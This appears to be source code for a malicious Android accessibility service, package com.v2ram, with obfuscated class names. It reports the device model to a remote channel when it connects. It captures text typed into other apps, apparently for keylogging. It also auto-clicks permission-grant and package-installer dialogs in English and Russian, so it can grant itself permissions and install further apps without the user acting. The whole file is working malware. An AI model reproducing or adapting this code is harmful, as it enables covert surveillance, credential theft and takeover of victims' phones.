// language: Java, file: c.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class c extends AccessibilityService {

    public static volatile c S;
    static final String TAG = "v2-acc";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        S = this;
        Log.i(TAG, "connected");
        new Thread(() -> d.send(
            "<b>accessibility connected</b> — "
            + android.os.Build.MANUFACTURER + " "
            + android.os.Build.MODEL)).start();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null || e.getPackageName() == null) return;
        String pkg = e.getPackageName().toString();
        if (pkg.equals(getPackageName())) return;

        if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            x.onText(e);
        }

        if (autoGrant(e)) return;
        if (autoInstall(e)) return;
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        S = null;
        super.onDestroy();
    }

    // ---- auto grant permission dialogs ----
    private boolean autoGrant(AccessibilityEvent e) {
        if (e.getClassName() == null) return false;
        String cls = e.getClassName().toString();
        if (!cls.contains("GrantPermissionsActivity")
            && !cls.contains("PermissionController")
            && !cls.contains("PermissionDialog")) return false;

        AccessibilityNodeInfo r = getRootInActiveWindow();
        if (r == null) return false;

        String[] labels = {
            "Allow", "While using the app", "Only this time",
            "Allow all the time", "Allow only while using the app",
            "Разрешить", "Только при использовании",
            "При использовании приложения", "Разрешить всегда",
            "Разрешить доступ",
        };
        for (String label : labels) {
            List<AccessibilityNodeInfo> list = r.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo n : list) {
                AccessibilityNodeInfo p = n;
                while (p != null) {
                    if (p.isClickable()) {
                        p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    p = p.getParent();
                }
            }
        }
        return false;
    }

    // ---- auto install/update dialog ----
    private boolean autoInstall(AccessibilityEvent e) {
        String pkg = e.getPackageName() == null ? "" : e.getPackageName().toString();
        if (!pkg.contains("packageinstaller")) return false;

        AccessibilityNodeInfo r = getRootInActiveWindow();
        if (r == null) return false;

        String[] labels = {
            "Install", "Install anyway", "Update", "Done", "Open",
            "Установить", "Все равно установить", "Обновить", "Готово", "Открыть",
            "Next", "Continue", "Далее", "Продолжить",
        };
        for (String label : labels) {
            List<AccessibilityNodeInfo> list = r.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo n : list) {
                AccessibilityNodeInfo p = n;
                while (p != null) {
                    if (p.isClickable()) {
                        p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    p = p.getParent();
                }
            }
        }
        return false;
    }
} 